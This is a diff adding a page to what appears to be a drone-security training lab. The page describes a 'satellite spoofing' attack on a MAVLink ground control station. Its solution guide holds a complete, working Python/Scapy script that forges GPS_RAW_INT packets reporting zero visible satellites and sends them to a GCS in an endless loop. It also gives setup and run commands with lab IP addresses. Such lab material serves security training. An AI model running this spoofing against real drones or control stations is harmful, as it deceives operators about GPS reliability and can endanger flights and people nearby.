@@ -1,0 +1,97 @@
+title: Satellite Spoofing
+order: 6
+description: Spoofing the number of satellites visible to the drone to mislead the Ground Control Station (GCS) about the GPS signal quality.
+breadcrumb:
+  - text: Attack Scenarios
+    link: /attacks
+  - text: Reconnaissance
+  - text: Satellite Spoofing
+
+sections:
+  - title: Description
+    content: |
+      Satellite spoofing involves sending false information about the number of satellites 
+      visible to the drone to the Ground Control Station (GCS). This can mislead the GCS 
+      about the GPS signal quality and the overall reliability of the drone's positioning system.
+
+  - title: Resources
+    content:
+      - text: MAVLink Protocol
+        link: https://mavlink.io/en/
+      - text: PyMAVLink Documentation
+        link: https://www.ardusub.com/developers/pymavlink.html
+
+  - title: Solution Guide
+    collapsible: true
+    steps:
+      - title: Step 1. Setup
+        description: |
+          Ensure you have Python and the necessary libraries installed:
+          ```sudo apt-get update
+          sudo apt-get install python3 python3-pip
+          pip3 install pymavlink scapy
+          ```
+
+      - title: Step 2. Create the Script
+        description: |
+          Create a Python script named `satellite-spoofing.py` and paste the following code:
+          ```from pymavlink import mavutil
+          from scapy.all import *
+          import time
+          import sys
+
+          def create_gps_raw_int(mav):
+              """
+              Create a MAVLink GPS_RAW_INT message with zero satellites visible.
+              """
+              gps_raw_int = mav.gps_raw_int_encode(
+                  time_usec=int(time.time() * 1e6),
+                  fix_type=1,  # No fix
+                  lat=473566100,  # Latitude (in degrees * 1e7)
+                  lon=854619300,  # Longitude (in degrees * 1e7)
+                  alt=1500,  # Altitude (in meters * 1000)
+                  eph=100,  # GPS HDOP horizontal dilution of position
+                  epv=100,  # GPS VDOP vertical dilution of position
+                  vel=500,  # GPS ground speed (m/s * 100)
+                  cog=0,  # Course over ground (degrees * 100)
+                  satellites_visible=0  # Number of satellites visible set to 0
+              )
+              return gps_raw_int.pack(mav)
+
+          def send_mavlink_packet(packet_data, target_ip, target_port):
+              """
+              Send a MAVLink packet using Scapy.
+              """
+              packet = IP(dst=target_ip) / UDP(dport=target_port) / Raw(load=packet_data)
+              send(packet)
+
+          if __name__ == "__main__":
+              if len(sys.argv) != 2:
+                  print("Usage: python satellite_spoof.py <ip:port>")
+                  sys.exit(1)
+
+              target = sys.argv[1]
+              target_ip, target_port = target.split(':')
+              target_port = int(target_port)
+
+              mav = mavutil.mavlink.MAVLink(None)
+              mav.srcSystem = 1
+              mav.srcComponent = 1
+
+              while True:
+                  gps_packet = create_gps_raw_int(mav)
+                  send_mavlink_packet(gps_packet, target_ip, target_port)
+                  print(f"Sent GPS spoofing packet with 0 satellites to {target_ip}:{target_port}")
+
+          ```
+
+      - title: Step 3. Run the Script
+        description: |
+          Execute the script with sudo and the target GCS IP and port:
+          ```sudo python satellite-spoofing.py <ip:port>
+          ```
+          Replace `<ip:port>` with the actual IP address and port of the QGroundControl App using `10.13.0.6:14550` or the GCS (MAVProxy) using `192.168.13.14:14550`/`10.13.0.4:14550`
+
+      - title: Step 4. Monitor the Effects
+        description: |
+          Observe the GCS to see the spoofed satellite count being displayed. The number of visible satellites will appear different from the actual count, misleading the operator about the GPS signal quality.
